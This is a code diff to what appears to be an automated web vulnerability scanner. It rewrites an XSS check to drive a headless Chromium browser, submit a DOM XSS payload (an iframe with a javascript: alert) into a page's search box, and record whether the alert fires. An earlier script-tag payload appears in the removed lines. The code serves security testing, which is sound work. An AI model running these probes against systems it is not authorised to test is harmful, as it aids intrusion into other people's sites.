@@ -135,31 +135,72 @@ def run_sqli_check(state) -> dict:
 def run_xss_check(state) -> dict:
     print(f"[vuln] Testing XSS on {state['target_url']} ...")
 
-    search_url = f"{state['target_url']}/rest/products/search"
-    test_payload = "<script>alert('xss')</script>"
+    from playwright.sync_api import sync_playwright
+
+    target_url = state["target_url"]
+    payload = "<iframe src=\"javascript:alert(`xss`)\">"
 
     try:
-        r = requests.get(search_url, params={"q": test_payload})
-        reflected_unescaped = test_payload in r.text
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            page = browser.new_page()
 
-        return {
-            "finding_type": "xss",
-            "data": {
-                "vulnerable": reflected_unescaped,
-                "tested_endpoint": search_url,
-                "detail": (
-                    "Payload reflected WITHOUT escaping — likely XSS"
-                    if reflected_unescaped
-                    else "Payload was escaped/sanitized or not reflected"
-                ),
-            },
-            "chain_trigger": False,
-            "chain_data": None,
-        }
+            triggered = False
+
+            def handle_dialog(dialog):
+                nonlocal triggered
+                triggered = True
+                dialog.dismiss()
+
+            page.on("dialog", handle_dialog)
+
+            page.goto(target_url, wait_until="networkidle")
+
+            search = page.locator("input[type='text']").first
+
+            if not search.is_visible():
+                browser.close()
+
+                return {
+                    "finding_type": "xss",
+                    "data": {
+                        "vulnerable": False,
+                        "detail": "Search input was not found."
+                    },
+                    "chain_trigger": False,
+                    "chain_data": None,
+                }
+
+            search.fill(payload)
+            search.press("Enter")
+
+            page.wait_for_timeout(1500)
+
+            browser.close()
+
+            return {
+                "finding_type": "xss",
+                "data": {
+                    "vulnerable": triggered,
+                    "tested_endpoint": target_url,
+                    "payload": payload,
+                    "detail": (
+                        "DOM XSS payload executed successfully."
+                        if triggered
+                        else "XSS payload did not execute."
+                    ),
+                },
+                "chain_trigger": False,
+                "chain_data": None,
+            }
+
     except Exception as e:
         return {
             "finding_type": "xss",
-            "data": {"vulnerable": False, "error": str(e)},
+            "data": {
+                "vulnerable": False,
+                "error": str(e)
+            },
             "chain_trigger": False,
             "chain_data": None,
         }
